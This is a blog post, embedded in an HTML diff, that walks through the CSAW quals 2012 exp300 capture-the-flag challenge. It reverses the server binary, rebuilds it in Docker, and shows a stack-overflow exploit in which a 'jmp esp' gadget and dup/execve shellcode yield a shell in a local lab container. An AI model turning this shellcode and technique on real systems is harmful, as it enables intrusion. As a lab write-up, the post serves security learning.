@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="First LookFirst, connect to the server and it would output some messages. 1这部分并不难，但我希望你有乐趣。如果你给我大量的数据，它可能是一件坏事会发生. After puts %x-%x-%x-%x as input, it gives us 1234连接接受。信号读取。做到。有一个错误。 There is nothing">
+<meta name="keywords" content="PWN,CSAW,Stack Overflow,JOP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAW quals 2012 - exp300">
+<meta property="og:url" content="http://yoursite.com/CSAW-quals-2012-exp300/index.html">
+<meta property="og:site_name" content="ShangKuei&#39;s Road Trip">
+<meta property="og:description" content="First LookFirst, connect to the server and it would output some messages. 1这部分并不难，但我希望你有乐趣。如果你给我大量的数据，它可能是一件坏事会发生. After puts %x-%x-%x-%x as input, it gives us 1234连接接受。信号读取。做到。有一个错误。 There is nothing">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-07-05T16:21:23.855Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAW quals 2012 - exp300">
+<meta name="twitter:description" content="First LookFirst, connect to the server and it would output some messages. 1这部分并不难，但我希望你有乐趣。如果你给我大量的数据，它可能是一件坏事会发生. After puts %x-%x-%x-%x as input, it gives us 1234连接接受。信号读取。做到。有一个错误。 There is nothing">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>CSAW quals 2012 - exp300</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/effective-modern-c-item-02/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/stack-overflow/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/CSAW-quals-2012-exp300/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/CSAW-quals-2012-exp300/&text=CSAW quals 2012 - exp300"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/CSAW-quals-2012-exp300/&is_video=false&description=CSAW quals 2012 - exp300"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAW quals 2012 - exp300&body=Check out this article: http://yoursite.com/CSAW-quals-2012-exp300/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/CSAW-quals-2012-exp300/&name=CSAW quals 2012 - exp300&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#First-Look"><span class="toc-number">1.</span> <span class="toc-text">First Look</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Environment-Setting"><span class="toc-number">2.</span> <span class="toc-text">Environment Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fork-based-environment"><span class="toc-number">2.1.</span> <span class="toc-text">Fork based environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dockerfile-creation"><span class="toc-number">2.2.</span> <span class="toc-text">dockerfile creation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CSAW quals 2012 - exp300
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ShangKuei's Road Trip</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-07-03T16:22:08.000Z" itemprop="datePublished">2018-07-04</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CSAW/">CSAW</a>, <a class="tag-link" href="/tags/JOP/">JOP</a>, <a class="tag-link" href="/tags/PWN/">PWN</a>, <a class="tag-link" href="/tags/Stack-Overflow/">Stack Overflow</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="First-Look"><a href="#First-Look" class="headerlink" title="First Look"></a>First Look</h1><p>First, connect to the server and it would output some messages.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这部分并不难，但我希望你有乐趣。如果你给我大量的数据，它可能是一件坏事会发生.</span><br></pre></td></tr></table></figure>
+<p>After puts <code>%x-%x-%x-%x</code> as input, it gives us</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">连接接受。</span><br><span class="line">信号读取。</span><br><span class="line">做到。</span><br><span class="line">有一个错误。</span><br></pre></td></tr></table></figure>
+<p>There is nothing useful.</p>
+<h1 id="Environment-Setting"><a href="#Environment-Setting" class="headerlink" title="Environment Setting"></a>Environment Setting</h1><p>So let’s look into its binary, it opens a port 4842 and is a fork-based binary.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048a86         mov        dword [esp+0x3c+var_3C], 4842        ; argument &quot;__hostshort&quot; for method j_htons</span><br><span class="line">0x08048a8d         call       j_htons                              ; htons</span><br></pre></td></tr></table></figure>
+<h2 id="Fork-based-environment"><a href="#Fork-based-environment" class="headerlink" title="Fork based environment"></a>Fork based environment</h2><p>In the <code>main</code> function, there is a function call to a function which registers <code>signal handler</code> for the problem</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x08048a0d         sub        esp, 0x1c                            ; End of unwind block (FDE at 0x80490b0), Begin of unwind block (FDE at 0x80490c8), CODE XREF=main+9</span><br><span class="line">0x08048a10         mov        dword [esp+0x1c+var_18], sub_8048804 ; argument &quot;__handler&quot; for method j_signal</span><br><span class="line">0x08048a18         mov        dword [esp+0x1c+var_1C], 0xc         ; argument &quot;__sig&quot; for method j_signal</span><br><span class="line">0x08048a1f         call       j_signal                             ; signal</span><br><span class="line">0x08048a24         mov        dword [esp+0x1c+var_18], forking     ; argument &quot;__handler&quot; for method j_signal</span><br><span class="line">0x08048a2c         mov        dword [esp+0x1c+var_1C], 0xa         ; argument &quot;__sig&quot; for method j_signal</span><br><span class="line">0x08048a33         call       j_signal                             ; signal</span><br><span class="line">0x08048a38         mov        dword [esp+0x1c+var_18], interest    ; argument &quot;__handler&quot; for method j_signal</span><br><span class="line">0x08048a40         mov        dword [esp+0x1c+var_1C], 0x1f        ; argument &quot;__sig&quot; for method j_signal</span><br><span class="line">0x08048a47         call       j_signal                             ; signal</span><br><span class="line">0x08048a4c         mov        eax, 0x1</span><br><span class="line">0x08048a51         add        esp, 0x1c</span><br><span class="line">0x08048a54         ret</span><br></pre></td></tr></table></figure>
+<p>After finishing <code>accept</code>, program will raise <code>signal 0xa</code> which is the function <code>forking</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048942         mov        eax, dword [esp+0x2c+var_10]</span><br><span class="line">0x08048946         mov        dword [dword_804b078], eax           ; dword_804b078</span><br><span class="line">0x0804894b         mov        dword [esp+0x2c+var_2C], 0xa         ; argument &quot;__sig&quot; for method j_raise</span><br><span class="line">0x08048952         call       j_raise</span><br></pre></td></tr></table></figure>
+<p>Inside <code>forking</code>, there is a function, I called, <code>switch_to_liaotian</code>. The decompile code of <code>switch_to_liaotian</code> is like</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">nt <span class="title">swtich_to_liaotian</span><span class="params">(<span class="keyword">int</span> arg0)</span> </span>&#123;</span><br><span class="line">    var_4 = arg0;</span><br><span class="line">    esp = esp - <span class="number">0x2c</span>;</span><br><span class="line">    var_10 = getpwnam(var_4);</span><br><span class="line">    <span class="keyword">if</span> (var_10 != <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048bd4;</span><br><span class="line"></span><br><span class="line">loc_8048baa:</span><br><span class="line">    <span class="built_in">fprintf</span>(*<span class="built_in">stderr</span>, <span class="number">0x8048ea8</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048bd4:</span><br><span class="line">    var_14 = *(var_10 + <span class="number">0x8</span>);</span><br><span class="line">    var_18 = *(var_10 + <span class="number">0xc</span>);</span><br><span class="line">    var_1C = *(var_10 + <span class="number">0x14</span>);</span><br><span class="line">    <span class="keyword">if</span> (setgid(var_18) == <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048c1d;</span><br><span class="line"></span><br><span class="line">loc_8048c05:</span><br><span class="line">    perror(<span class="number">0x8048ecd</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048c1d:</span><br><span class="line">    <span class="keyword">if</span> (setuid(var_14) == <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048c45;</span><br><span class="line"></span><br><span class="line">loc_8048c2d:</span><br><span class="line">    perror(<span class="number">0x8048edd</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048c45:</span><br><span class="line">    <span class="keyword">if</span> (seteuid(var_14) == <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048c6d;</span><br><span class="line"></span><br><span class="line">loc_8048c55:</span><br><span class="line">    perror(<span class="number">0x8048eed</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048c6d:</span><br><span class="line">    <span class="keyword">if</span> (setegid(var_18) == <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048c95;</span><br><span class="line"></span><br><span class="line">loc_8048c7d:</span><br><span class="line">    perror(<span class="number">0x8048efe</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048c95:</span><br><span class="line">    <span class="keyword">if</span> (chdir(var_1C) == <span class="number">0x0</span>) <span class="keyword">goto</span> loc_8048cbd;</span><br><span class="line"></span><br><span class="line">loc_8048ca5:</span><br><span class="line">    perror(<span class="number">0x8048f0f</span>);</span><br><span class="line">    eax = <span class="built_in">exit</span>(<span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line"></span><br><span class="line">loc_8048cbd:</span><br><span class="line">    signal(<span class="number">0x11</span>, <span class="number">0x1</span>);</span><br><span class="line">    eax = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">return</span> eax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>It first uses <code>getpwnam</code> to get the <code>arg0</code>‘s account info, and <code>arg0</code> is string <code>liaotian</code>. Then the program will try changing the current user permission to <code>liaotian</code>, if the attempting fails, it will output some error message and exit the program. After changing permission, it will switch current path to <code>liaotian</code>‘s home directory. Finally, if all function call is sucessfully done,  <code>singal SIGSEGV</code> will set to <code>SIG_IGN</code>.</p>
+<h2 id="dockerfile-creation"><a href="#dockerfile-creation" class="headerlink" title="dockerfile creation"></a><code>dockerfile</code> creation</h2><p>With those information we can create a virtual machine to hold the problem for practicing.</p>
+<ol>
+<li>Socket port is <code>4842</code>.</li>
+<li>It is a fork-based binary.</li>
+<li>User name is <code>liaotian</code> and needs home folder.</li>
+</ol>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">14.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> dpkg --add-architecture i386</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">RUN apt-get install -y libc6:i386</span><br><span class="line">RUN apt-get install -y gcc socat libreadline-dev make</span><br><span class="line"></span><br><span class="line"># create users</span><br><span class="line">RUN useradd -ms /bin/bash liaotian</span><br><span class="line"></span><br><span class="line"># build</span><br><span class="line">RUN echo "kernel.randomize_va_space = 2" &gt; /etc/sysctl.d/01-disable-aslr.conf</span><br><span class="line">RUN chown -R root:liaotian /home/liaotian/</span><br><span class="line">RUN chmod 750 /home/liaotian</span><br><span class="line">RUN echo "The flag is 71e23a6825a4e96cf0f36194971af56e." &gt; /home/liaotian/flag</span><br><span class="line">RUN chown root:liaotian /home/liaotian/flag</span><br><span class="line">RUN chmod 440 /home/liaotian/flag</span><br><span class="line">RUN chmod 740 /usr/bin/top</span><br><span class="line">RUN chmod 740 /bin/ps</span><br><span class="line">RUN chmod 740 /usr/bin/pgrep</span><br><span class="line">RUN export TERM=xterm</span><br><span class="line"></span><br><span class="line">WORKDIR /home/liaotian/</span><br><span class="line">COPY exploit300 /home/liaotian/liaotian</span><br><span class="line">RUN chmod 750 /home/liaotian/liaotian</span><br><span class="line">RUN chown root:liaotian /home/liaotian/liaotian</span><br><span class="line"></span><br><span class="line">USER liaotian</span><br><span class="line"></span><br><span class="line">EXPOSE 4842</span><br><span class="line">CMD /home/liaotian/liaotian</span><br></pre></td></tr></table></figure>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>After <code>fork</code> and <code>switch_to_liaotian</code>, program is in a function which will send something then raise <code>singal 0x1f</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x080488db         lea        edx, dword [eax-1]</span><br><span class="line">0x080488de         mov        eax, dword [dword_804b078]           ; dword_804b078</span><br><span class="line">0x080488e3         mov        dword [esp+0x3c+var_30], 0x0         ; argument &quot;__flags&quot; for method j_send</span><br><span class="line">0x080488eb         mov        dword [esp+0x3c+var_34], edx         ; argument &quot;__n&quot; for method j_send</span><br><span class="line">0x080488ef         mov        edx, dword [esp+0x3c+var_10]</span><br><span class="line">0x080488f3         mov        dword [esp+0x3c+var_38], edx         ; argument &quot;__buf&quot; for method j_send</span><br><span class="line">0x080488f7         mov        dword [esp+0x3c+var_3C], eax         ; argument &quot;__fd&quot; for method j_send</span><br><span class="line">0x080488fa         call       j_send                               ; send</span><br><span class="line">0x080488ff         mov        dword [esp+0x3c+var_3C], 0x1f        ; argument &quot;__sig&quot; for method j_raise</span><br><span class="line">0x08048906         call       j_raise</span><br></pre></td></tr></table></figure>
+<p><code>Signal 0x1f</code>‘s handler will <code>puts</code> message then call a interesting function to <code>read</code> massive input.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; singal handler for 0x1f</span><br><span class="line">0x08048898         sub        esp, 0x1c                             ; End of unwind block (FDE at 0x8049030), Begin of unwind block (FDE at 0x8049048), DATA XREF=signal_handler+43</span><br><span class="line">0x0804889b         mov        dword [esp+0x1c+var_1C], aXe4xbfxa1xe5x8          ; argument &quot;__s&quot; for method j_puts, &quot;\\xE4\\xBF\\xA1\\xE5\\x8F\\xB7\\xE8\\xAF\\xBB\\xE5\\x8F\\x96\\xE3\\x80\\x82&quot;</span><br><span class="line">0x080488a2         call       j_puts                                ; puts</span><br><span class="line">0x080488a7         call       read_something                        ; read_something</span><br><span class="line">0x080488ac         add        esp, 0x1c</span><br><span class="line">0x080488af         ret</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">               read_something:</span><br><span class="line">0x0804886e         sub        esp, 0x15c                            ; End of unwind block (FDE at 0x8049010), Begin of unwind block (FDE at 0x8049030), CODE XREF=interest+15</span><br><span class="line">0x08048874         mov        eax, dword [dword_804b078]            ; dword_804b078</span><br><span class="line">0x08048879         mov        dword [esp+0x15c+var_154], 0x800      ; argument &quot;__nbytes&quot; for method j_read</span><br><span class="line">0x08048881         lea        edx, dword [esp+0x15c+var_146]</span><br><span class="line">0x08048885         mov        dword [esp+0x15c+var_158], edx        ; argument &quot;__buf&quot; for method j_read</span><br><span class="line">0x08048889         mov        dword [esp+0x15c+var_15C], eax        ; argument &quot;__fd&quot; for method j_read</span><br><span class="line">0x0804888c         call       j_read                                ; read</span><br><span class="line">0x08048891         add        esp, 0x15c</span><br><span class="line">0x08048897         ret</span><br></pre></td></tr></table></figure>
+<p>It is not hard to notice inside function <code>read_something</code> that it only allocates <code>0x15c bytes</code> in stack, but read <code>0x800 bytes</code> to <code>[esp+0x15c-0x146]</code>. So the stack will like this.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+</span><br><span class="line">|     ret addr       |  </span><br><span class="line">+--------------------+ esp + 0x15c</span><br><span class="line">|     ......         |</span><br><span class="line">+--------------------+</span><br><span class="line">|     var_146        |</span><br><span class="line">+--------------------+ esp + 0x15c - 0x146</span><br><span class="line">|     ......         |</span><br><span class="line">+--------------------+</span><br><span class="line">|     var_154        |</span><br><span class="line">+--------------------+ esp + 0x15c - 0x158</span><br><span class="line">|     var_158        |</span><br><span class="line">+--------------------+ esp + 0x15c - 0x158</span><br><span class="line">|     var_15C        |</span><br><span class="line">+--------------------+ esp + 0x15c - 0x15c</span><br></pre></td></tr></table></figure>
+<p>If we send massive input, we can overwrite <code>ret addr</code>. The problem is how to gain the <code>eip</code> control.</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>If we overwrite the <code>ret addr</code>, and after the function returned, the esp will replace by <code>[ret addr] + 4</code>. So here comes <code>JOP</code>(jump-oriented programming). </p>
+<p>First, we need to find a instruction <code>jmp esp</code> by <code>ROPgadget</code>.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@9cb9de1840f0:/samples<span class="comment"># ROPgadget --binary exploit300  | grep "jmp esp"</span></span><br><span class="line">0x08048f93 : add byte ptr [esp + edi*8 - 1], dl ; jmp esp</span><br><span class="line">0x08048f91 : add dword ptr [eax], eax ; add byte ptr [esp + edi*8 - 1], dl ; jmp esp</span><br><span class="line">0x08048f8f : dec esp ; add dword ptr [eax], eax ; add byte ptr [esp + edi*8 - 1], dl ; jmp esp</span><br><span class="line">0x08048f47 : jmp esp</span><br></pre></td></tr></table></figure>
+<p>Second, put a <code>dup(fd) + execve(/bin/sh)</code> shellcode after <code>ret addr</code></p>
+<p>Then, we are able to get the shell.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@8e7ba55f8c44:/samples<span class="comment"># python poc.py</span></span><br><span class="line">[*] <span class="string">'/samples/exploit300'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[*]     Binary: exploit300</span><br><span class="line">          - Type: fork-based</span><br><span class="line">          - Arch: i386</span><br><span class="line">        Remote: True</span><br><span class="line">          - host: 172.18.0.2</span><br><span class="line">          - port: 4842</span><br><span class="line">[+] Opening connection to 172.18.0.2 on port 4842: Done</span><br><span class="line">[*] 这部分并不难，但我希望你有乐趣。如果你给我大量的数据，它可能是一件坏事会发生.</span><br><span class="line">[*] 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000140  41 41 41 41  41 41 47 8f  04 08 6a ff  6a 07 89 e5  │AAAA│AAG·│··j·│j···│</span><br><span class="line">    00000150  5b 5e 6a 66  58 46 8d 4c  24 e0 6a 04  60 <span class="built_in">cd</span> 80 85  │[^jf│XF·L│$·j·│`···│</span><br><span class="line">    00000160  c0 61 5a 75  ed 89 f3 6a  03 59 49 6a  3f 58 <span class="built_in">cd</span> 80  │·aZu│···j│·YIj│?X··│</span><br><span class="line">    00000170  75 f8 6a 68  68 2f 2f 2f  73 68 2f 62  69 6e 89 e3  │u·jh│h///│sh/b│<span class="keyword">in</span>··│</span><br><span class="line">    00000180  68 01 01 01  01 81 34 24  72 69 01 01  31 c9 51 6a  │h···│··4$│ri··│1·Qj│</span><br><span class="line">    00000190  04 59 01 e1  51 89 e1 31  d2 6a 0b 58  <span class="built_in">cd</span> 80        │·Y··│Q··1│·j·X│··│</span><br><span class="line">    0000019e</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$</span><br><span class="line">$ cat flag</span><br><span class="line">The flag is 71e23a6825a4e96cf0f36194971af56e.</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/liaotian</span><br><span class="line">$ whoami</span><br><span class="line">liaotian</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
